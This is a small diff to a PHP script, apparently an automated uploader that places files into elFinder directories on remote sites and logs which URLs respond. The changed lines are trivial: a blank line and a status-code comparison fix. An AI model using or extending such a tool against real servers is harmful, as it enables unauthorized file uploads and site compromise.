@@ -53,6 +53,7 @@ function ngirim($url, $isi){
     		curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
     		curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie');
     		curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie');
+    		
     		$ch=curl_exec($ch);
     		return $ch;
     		}
@@ -175,7 +176,7 @@ echo $YY."[!] File Uploaded To ../../elfinder/files/".$nama_doang." [!]".$X."\n\
         curl_exec($ch);
         $header = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         $write  = "";
-        if(!($header == "404" OR $header == "0")) { //NOR
+        if(!($header == 404 OR $header == 0)) {
             $hdr   = "
 header : " . $header . "
 Url    : " . $url;
